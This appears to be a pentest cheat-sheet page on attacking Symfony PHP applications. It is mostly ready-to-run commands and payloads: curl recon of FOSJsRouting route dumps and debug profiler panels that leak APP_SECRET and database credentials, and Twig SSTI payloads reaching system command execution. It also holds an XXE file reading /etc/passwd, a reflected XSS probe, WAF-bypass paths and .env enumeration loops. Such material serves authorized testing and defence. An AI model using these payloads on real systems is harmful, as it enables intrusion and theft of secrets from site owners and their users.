---
tags:
  - high
  - server-side
---

# Symfony Framework Security

*PHP Symfony attack surface: route disclosure, debug mode, Twig SSTI, profiler endpoints, and admin path enumeration.*

---

## TL;DR

```bash
# Route disclosure via FOSJsRoutingBundle
curl "https://target.com/js/routing?callback=fos.Router.setData"

# Symfony debug profiler
curl "https://target.com/_profiler/"
curl "https://target.com/_profiler/latest?panel=request"

# Twig SSTI test
{{7*7}}  # → 49 in vulnerable parameter
```

---

## How It Works

Symfony is a PHP web framework. Common production configurations expose:

1. **FOSJsRoutingBundle** — Exposes all application routes as JSON for JavaScript clients
2. **Symfony Profiler** — Development toolbar that leaks internal data when accidentally left enabled in production
3. **Twig templates** — Server-side rendering engine vulnerable to SSTI if user input reaches template context
4. **Debug mode** — `APP_ENV=dev` activates verbose error pages with full stack traces, env variables, and source code

---

## Detection

### Fingerprinting Symfony

```bash
# Response headers
curl -I https://target.com/ | grep -i "symfony\|x-debug-token"

# HTML source
curl -s https://target.com/ | grep -i "symfony\|twig\|sf-toolbar"

# Debug toolbar (dev mode)
curl -s https://target.com/ | grep -i "_wdt\|profiler"

# FOSJsRoutingBundle
curl -s "https://target.com/js/routing" | head -20
# → fos.Router.setData({...routes...})

# Common paths
/_profiler/
/_wdt/
/_error/500
/js/routing
/js/routing?callback=fos.Router.setData
```

### Version Detection

```bash
# Error pages in dev mode expose version
curl "https://target.com/nonexistent-path-xyz"

# Composer files (if exposed)
curl "https://target.com/composer.json"
curl "https://target.com/composer.lock"
# Look for: "symfony/framework-bundle": "^X.Y"
```

---

## Exploitation

### 1. FOSJsRoutingBundle — Route Disclosure

**What it exposes:** Complete route list of the Symfony application — admin routes, API endpoints, file operations, debug utilities.

```bash
# Basic route dump
curl -s "https://target.com/js/routing?callback=fos.Router.setData"

# Pretty print
curl -s "https://target.com/js/routing?callback=fos.Router.setData" | \
  python3 -c "
import sys, re, json
data = sys.stdin.read()
# Strip JSONP wrapper
m = re.search(r'fos\.Router\.setData\((.*)\)', data, re.DOTALL)
if m:
    routes = json.loads(m.group(1))
    for name, info in routes.get('routes', {}).items():
        print(f\"{name}: {info.get('path', 'N/A')}\")
"
```

**High-value route patterns to look for:**

```
# SSRF candidates
*curl*, *fetch*, *request*, *proxy*, *webhook*

# File operations
*download*, *upload*, *read*, *export*, *filesystem*, *log*

# Admin functions
*admin*, *sysadmin*, *systemadmin*, *manage*, *config*

# Authentication bypass candidates
*csrf*, *token*, *login*, *auth*

# Debug / internal
*debug*, *health*, *status*, *info*, *test*
```

```bash
# Filter high-value routes from dump
curl -s "https://target.com/js/routing?callback=fos.Router.setData" | \
  grep -Ei "admin|curl|download|upload|read|debug|token|export|log|filesystem"
```

!!! danger "Impact"
    A full route dump reveals the complete attack surface of the application including hidden admin panels, file operations, and internal utilities. Cross-reference each sensitive route against authentication requirements.

### Testing Route Authentication

```bash
BASE="https://target.com"
# Probe a list of discovered routes for auth requirement
for ep in "/_admin/dashboard" "/_admin/users" "/api/internal/export" "/files/download"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "$BASE$ep" -L --max-redirs 1)
  echo "$STATUS $ep"
done
# 200 = no auth (potential finding)
# 302 = redirects to login
# 401/403 = auth required
```

### 2. Callback Parameter (JSONP Reflection)

FOSJsRoutingBundle reflects the `callback` parameter directly in the response:

```bash
# Check Content-Type
curl -I "https://target.com/js/routing?callback=TEST_CALLBACK"
# application/javascript → browser executes, but NOT HTML → no direct XSS
# BUT: old versions return text/html → reflected XSS
```

```bash
# Version < 2.x may return text/html → XSS
curl "https://target.com/js/routing?callback=<script>alert(1)</script>"

# Test for text/html response
curl -sI "https://target.com/js/routing?callback=PROBE" | grep -i content-type
```

### 3. Symfony Profiler — Data Leakage

The Symfony debug profiler (enabled in `dev` or accidentally in production) exposes:
- All request/response data
- Environment variables (including secrets)
- Database queries with full SQL
- Symfony version and installed bundles
- Source code snippets

```bash
# Profiler index
curl "https://target.com/_profiler/"
curl "https://target.com/_profiler/latest"

# Specific panels
curl "https://target.com/_profiler/TOKEN?panel=request"    # Request/response data
curl "https://target.com/_profiler/TOKEN?panel=config"     # App config + env vars
curl "https://target.com/_profiler/TOKEN?panel=security"   # Auth info, user context
curl "https://target.com/_profiler/TOKEN?panel=db"         # Database queries
curl "https://target.com/_profiler/TOKEN?panel=logs"       # Application logs

# Debug web toolbar
curl "https://target.com/_wdt/TOKEN"

# Auto-get latest profiler token
TOKEN=$(curl -s "https://target.com/_profiler/latest" | \
  grep -oP '(?<=href="/_profiler/)[a-f0-9]+' | head -1)
curl "https://target.com/_profiler/${TOKEN}?panel=config"
```

!!! danger "Secrets via profiler"
    The `config` panel displays all environment variables including `APP_SECRET`, database passwords, API keys, JWT secrets, SMTP credentials, etc.

### 4. Twig SSTI

If user input reaches a Twig template context unsanitized:

```
# Detection
{{7*7}}         → 49 (vulnerable)
{{7*'7'}}       → "7777777" (Twig-specific)
${7*7}          → not Twig (try other engines)

# Information disclosure
{{app.request.server.all|join(',')}}
{{app.user}}
{{app.request.headers}}

# Environment variable extraction
{{app.request.server.get('APP_SECRET')}}
{{app.request.server.get('DATABASE_URL')}}

# RCE (Twig sandbox must be disabled)
{{["id"] | filter("system")}}
{{['id']|map('system')|join}}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
```

!!! warning "Twig Sandbox"
    Twig has a sandbox mode that restricts function calls. Check if sandbox is active before attempting RCE. Information disclosure is still possible even in sandboxed mode.

### 5. Debug Mode (`APP_ENV=dev`)

When Symfony runs in debug mode:

```bash
# Verbose error pages with stack traces
curl "https://target.com/?foo=bar%00"  # Null byte sometimes triggers error

# Access to /_error routes
curl "https://target.com/_error/500"
curl "https://target.com/_error/404"

# Error pages reveal:
# - Full stack traces
# - Request/response dump
# - Symfony version
# - Class names and file paths
# - Sometimes environment variables
```

### 6. CSRF Token Endpoints

Some Symfony applications expose unauthenticated CSRF token endpoints:

```bash
# Common Symfony CSRF token endpoint patterns
curl "https://target.com/_csrf/token"
curl "https://target.com/api/csrf"
curl "https://target.com/getcsrf"

# Impact: If CSRF tokens are obtainable without auth
# → CSRF protection is effectively bypassed for all forms
```

### 7. XXE via XML Upload Endpoints

Symfony applications frequently handle EAD (Encoded Archival Description) or other XML formats:

```bash
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <element>&xxe;</element>
</root>
EOF

curl -X POST "https://target.com/upload/xml" \
  -F "file=@/tmp/xxe.xml;type=text/xml"
```

---

## Bypasses

### WAF Bypass for Symfony Admin Paths

If the WAF blocks a path pattern literally (e.g., `/_admin/`):

```bash
# %2f encoding (breaks string pattern matching)
curl --path-as-is "https://target.com/_admin%2flogin"

# Case variation (depends on Symfony case sensitivity)
curl "https://target.com/_Admin/login"  # Symfony is case-sensitive → likely 404

# Path parameter insertion (Java-style, sometimes works in PHP too)
curl "https://target.com/_admin;x=1/login"
```

### Route Enumeration Without FOSJsRouting

If FOSJsRoutingBundle is not installed, enumerate routes via:

```bash
# Common Symfony admin prefixes
for prefix in "_admin" "admin" "_backend" "manage" "backoffice" "bo"; do
  for path in "" "/login" "/dashboard" "/users"; do
    curl -so /dev/null -w "%{http_code} https://target.com/${prefix}${path}\n" \
      "https://target.com/${prefix}${path}"
  done
done

# Sitemap
curl "https://target.com/sitemap.xml"

# robots.txt
curl "https://target.com/robots.txt"
```

---

## Rapid Recon

```bash
TARGET="https://target.com"

echo "[*] Route disclosure:"
curl -s "$TARGET/js/routing?callback=fos.Router.setData" | wc -c

echo "[*] Profiler:"
curl -so /dev/null -w "%{http_code}" "$TARGET/_profiler/"

echo "[*] Debug toolbar:"
curl -so /dev/null -w "%{http_code}" "$TARGET/_wdt/"

echo "[*] Composer:"
for f in composer.json composer.lock; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$f")
  echo "$code $TARGET/$f"
done

echo "[*] Exposed config files:"
for f in .env .env.local .env.production config/secrets.yaml; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$f")
  echo "$code $TARGET/$f"
done
```

---

## Checklist

- [ ] Check `/js/routing` for route disclosure
- [ ] Filter discovered routes for admin/sensitive patterns
- [ ] Probe each sensitive route for authentication requirement
- [ ] Check `/_profiler/` and `/_wdt/` endpoints
- [ ] Test `APP_ENV=dev` artifacts (verbose errors, stack traces)
- [ ] Test SSTI in form fields, URL parameters, profile fields
- [ ] Check CSRF token endpoint accessibility without auth
- [ ] Look for XML upload endpoints (XXE vector)
- [ ] Check `composer.lock` for installed bundle versions
- [ ] Enumerate `.env`, `.env.local`, `.env.production` files

---

## References

- [FOSJsRoutingBundle GitHub](https://github.com/FriendsOfSymfony/FOSJsRoutingBundle)
- [Tenable WAS Plugin 113639 — Route Disclosure](https://www.tenable.com/plugins/was/113639)
- [Twig SSTI Payloads](https://github.com/carlospolop/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Symfony Security Advisories](https://symfony.com/blog/category/security-advisories)
- [PayloadsAllTheThings — SSTI](https://github.com/carlospolop/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
